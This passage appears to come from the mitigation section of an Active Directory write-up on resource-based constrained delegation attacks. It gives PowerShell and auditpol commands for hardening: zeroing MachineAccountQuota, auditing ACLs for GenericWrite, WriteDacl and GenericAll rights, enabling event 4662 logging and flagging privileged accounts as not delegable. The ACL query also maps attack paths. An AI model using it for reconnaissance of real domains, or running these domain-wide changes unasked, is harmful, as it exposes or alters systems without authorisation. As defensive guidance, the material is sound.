- Protect credential stores, like password manager databases, with strong master passwords or key files in addition to Windows user [accounts](https://keepass.info/help/base/keys.html).
- Enforce secure password policies to prevent the (re)use of weak passwords.
- Set `MachineAccountQuota` to `0` for regular users to eliminate a common way to perform the first step of the RBCD attack: `Set-ADDomain -Identity corp.local -Replace @{"ms-DS-MachineAccountQuota"="0"}`.
- Review ACLs over all computer objects in the AD regularly for accounts with `GenericWrite`, `WriteDacl` or `GenericAll` over a computer object because they can be used for an RBCD attack:
        ```
        Get-DomainObjectAcl -ResolveGUIDs -Identity "TargetMachine" |
        Where-Object { $_.ActiveDirectoryRights -match "GenericWrite|GenericAll|WriteDacl" } |
        Select-Object SecurityIdentifier, ActiveDirectoryRights
        ```
- Setup audit policies so that attribute modifications generate event id 4662 in logs:
        ```
        auditpol /set /subcategory:"Directory Service Changes" /success:enable /failure:enable
        ```
- To protect privileged accounts from impersonation, mark them with the `AccountNotDelegated` flag:
        ```
        Set-AdUser -Identity "Administrator" -AccountNotDelegated $true
        ```
